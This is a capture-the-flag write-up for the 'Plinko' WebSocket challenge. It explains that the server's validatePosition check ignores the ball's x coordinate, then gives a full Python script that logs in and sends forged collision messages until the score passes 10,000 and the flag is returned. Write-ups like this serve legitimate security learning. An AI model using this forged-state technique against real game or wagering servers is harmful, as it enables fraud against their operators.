# Plinko writeups
### Team: UIT.4KySiNguLam

![image](https://github.com/user-attachments/assets/d626dd8c-d45a-4242-8bcb-51bab8cb2218)

## Overview
- This web application allows player **throw** a ball into **Plinko** game through **WebSocket** interaction. When player start a turn, they send a `join` message through **WebSocket** to participate in original state of the ball (location, speed, time). After that, player send a chain of messages stimulate collisions of the ball and obstacle (pins, wall, ground surface).
```javascript
let index = Math.floor(ballPos.x/(1000/19));
if (index < 0) index = 0;
if (index >= multipliers.length) index = multipliers.length-1;
let points = multipliers[index] * 100;
users[req.session['user']].points += points;
if (users[req.session['user']].points > 10000)
    socketSend(ws, points + flag, () => ws.close());
else
    socketSend(ws, points, () => ws.close());
```
- When the ball "fall down" to ground surface (detected when it collide with object have coordinate {x: 500, y: 1000}), web application count "prize" base on width coordinate (x) of the ball.
## Vulnerability
- In the `validatePosition` function, the application only compares the `y` component of the position and velocity based on physical laws (with gravitational acceleration) and only updates the `y` component of the velocity (with the condition that the x component of the velocity remains unchanged—checked by `Math.abs(prevVelo.x - currVelo.x) <= 0.001)`. This means that the `x` component of the position is not verified (except for the initial requirement in the "join" message where `ballPos.x` must be 500). After that, the player is free to override the value of `ballPos.x` in subsequent collision messages..
## Exploitation
1. Send a Valid Join Message
First, send a join message with the ball’s starting position set to `{x: 500, y: 0}` and an initial velocity `(for example, {x: 0, y: 0})`. This satisfies the server’s requirement for the join phase.
2. Override the x-coordinate in Collision Messages
In subsequent collision messages, while you must provide a `y-coordinate` and `y-velocity` that comply with the physics calculations, you are free to choose any value for the `x-coordinate` in position.

For instance, when simulating a collision with the ground `(the obstacle is at {x: 500, y: 1000})`, you can send a collision message with:
- `position`: Set the y-coordinate according to the physics `(e.g., 0.27778)`, but choose an `x-coordinate` that lands in the “lane” with the highest reward (for example, x: 0 if that lane gives the maximum multiplier).
- `velocity`: Provide the corresponding velocity that meets the physics checks `(e.g., {x: 0, y: 0.28333})`.
- `time`: A chosen timestamp `(e.g., 17)` that fits the calculation.
3. Collect Points and Obtain the Flag
Since each successful round `(i.e., a collision with the ground)` awards you points , you can play several rounds. Once your total points exceed 10,000, the server’s logic will trigger a response that appends the flag to the points value, allowing you to capture the flag.
4. Get flag.
- This is my exploit code by python. You can replace your username and password into `username` and `password` variable.

```python
import json
import time
import requests
from websocket import create_connection

chall_url = "https://plinko.chall.lac.tf"
WS_URL   = "wss://plinko.chall.lac.tf"
username = "1234"
password = "1234"

session = requests.Session()

def signup():
    url = f"{chall_url}/signup"
    data = {"username": username, "password": password}
    r = session.post(url, json=data, verify=False)  

def login():
    url = f"{chall_url}/login"
    data = {"username": username, "password": password}
    r = session.post(url, json=data, verify=False)
    if r.status_code != 200:
        exit(1)

def play_round():
    cookies = session.cookies.get_dict()
    cookie_str = "; ".join([f"{k}={v}" for k, v in cookies.items()])
    headers = {"Cookie": cookie_str}
    
    ws = create_connection(WS_URL, header=headers)
    
    join_msg = {
        "msgType": "join",
        "ballPos": {"x": 500, "y": 0},
        "ballVelo": {"x": 0, "y": 0},
        "time": 0
    }
    ws.send(json.dumps(join_msg))
    
    try:
        join_resp = ws.recv()
    except Exception as e:
        print("error", e)
    
    collision_msg = {
        "position": {"x": 0, "y": 0.27778},
        "obsPosition": {"x": 500, "y": 1000},
        "velocity": {"x": 0, "y": 0.28333},
        "time": 17
    }
    ws.send(json.dumps(collision_msg))
    
    try:
        collision_resp = ws.recv()
    except Exception as e:
        collision_resp = ""
    ws.close()
    return collision_resp

def main():
    signup()
    login()
    
    round_count = 0
    flag_found = False

    while not flag_found:
        round_count += 1
        resp = play_round()
        if "lactf{" in resp:
            print("\n[***] Flag received!")
            print(resp)
            flag_found = True
            break

if __name__ == "__main__":
    main()
```
- Just get it.

![image](https://github.com/user-attachments/assets/4ddce572-2ea5-4e40-b482-07f2c2dbe719)


